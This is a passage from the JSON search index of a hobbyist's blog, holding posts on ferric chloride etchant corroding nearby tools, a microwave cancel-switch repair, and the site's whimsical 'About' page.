Tenon"},{"categories":["Workbench"],"contents":"FeCl3 is that stuff we use to etch circuit boards; apparently there are other uses for it too. It etches most things, including, it would seem, the lid of the jar I kept spent etchant in, the M10 studding on the bench underneath, and most surprisingly for me—for my chemistry is rather rusty—the plastic cap of the clamp on the shelf in front of it.\nHere\u0026rsquo;s the damage control: Ferric Damage: it really does etch... The studding was a mass of rust in the middle. I hated to throw it, so I took most off with a wire brush and then, lacking a die, re-cut the thread with a nut, a spanner, and washing up liquid for a lubricant. Now that is why we store it carefully in a large jar with plenty of space\u0026hellip;\n","permalink":"https://2e0byo.github.io/post/workbench/a-lesson-in-ferric-chloride/","tags":null,"title":"A lesson in Ferric Chloride"},{"categories":["repairs"],"contents":"There is a nasty thing out there called \u0026lsquo;built in obsolescence\u0026rsquo;, which is supposed to cure the fact that most things are actually made quite well and would last a long time if left to themselves. Here is a microwave: Well at any rate, there\u0026rsquo;s most of a microwave. The \u0026lsquo;cancel\u0026rsquo; button was no longer working. What makes me think the entire microwave is being held hostage by a £0.03 switch? Let\u0026rsquo;s take the case off and have a look:\nMicrowaves are about the only bit of domestic equipment which will easily electrocute you. So we stay a long way away from all the high voltage lines:\nThank you.\nUnplug from the front of the case...\nHelpfully, a \u0026lsquo;schematic\u0026rsquo; is provided. It would be nice if it actually told us something about the \u0026lsquo;digital programmer circuit\u0026rsquo;.\nA multimeter on the back of the switch and, sure enough, mechanical failure. Of course, they went and glued the knob on, so we can\u0026rsquo;t just unscrew the board, but need to desolder it:\nDesoldering temperatures...\nFree!\nThe only similar switch I could find was on another board saved from something long thrown out and had to be desoldered. And of course, the shaft was the wrong length, and I noticed after soldering it on, so it had to be cut and filed in situ.\nAnd there we have it. Put it back together carefully\u0026hellip;\n\u0026hellip;and it now \u0026lsquo;cancels\u0026rsquo;. All for a switch which, in the end, cost me nothing. I wonder how many of these are shipped around the world to bury them each year because of something as simple?\n","permalink":"https://2e0byo.github.io/post/repairs/microwave-repair/","tags":null,"title":"Microwave repair"},{"categories":null,"contents":"Gardener Joe\u0026mdash;that great and renowned figure\u0026mdash;had a mouth like an \u0026lsquo;O\u0026rsquo;, but of what interest was that alongside his wheelbarrow full of surprises? This website resembles a wheelbarrow in several ways: it is no doubt full of (rather poor) surprises, generally of the how-not-to-do-things variety, it is all balanced rather precariously on one wheel and could pitch over any moment and make a mess, and it is liable to be forgotten for months and then overworked on a hot summer\u0026rsquo;s afternoon. It is, in short, a website about things, not people or ideas. Now things are infinitely (or rather, categorically) less important than people and ideas. It is for that reason I do not scatter these latter over the pages of the internet. Ho! anyone who thirsts for philosophical or theological ramblings, let him seek elsewhere! 1 Fools barge in where Angels fear to tread (for instance, in an over-crowded under-tidied workshop).\nIn real life I am other things, here I am simply one who makes things, and makes things other things, and makes things which were made not to work again to breathe: one who resurrects, betimes, the dead and dying things a dead and decaying civilisation has for debris left in its wake. For they don\u0026rsquo;t make ’em like they used to. And so we must do it ourselves.\nSome of the things shown here were made by doing things it would probably not be a good idea to repeat. Those of us who live learn like that: I\u0026rsquo;m much more wary now, say, of mains electricity than I was ten years ago. I\u0026rsquo;ve had the odd mild shock and I don\u0026rsquo;t want any more: so I\u0026rsquo;m mildly careful. But it follows that what I now think a good idea will probably, in ten years\u0026rsquo; time, seem daft. You have been warned! Anyone who repeats any of this does so at their own risk.\nSimilarly there is very little original here. I\u0026rsquo;ve tried to indicate some of the places I found things. But no man is an island: no idea is home-grown. If I should have indicated you and haven\u0026rsquo;t, contact me and I\u0026rsquo;ll rectify it. The header photo, for instance, comes from the incomparable Boy Mechanic of 1925. Lastly: this site is largely a vanity project. Vanity of vanities, all here is vanity. I\u0026rsquo;ll try to get back to any serious messages I receive. But there are better people out there. Jack one may try to be of all trades, but one must resolve: master, then of none. Or at any rate, I won\u0026rsquo;t admit it here.\nFor instance in Dorothy Sayers, who observed that no badly built table ever came from the carpenter\u0026rsquo;s workshop in Nazareth, or in the excellent reflections on work of Jacques Maritain.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://2e0byo.github.io/page/about/","tags":null,"title":"About"},{"categories":null,"contents":"","permalink":"https://2e0byo.github.io/search/","tags":null,"title":"Search"}]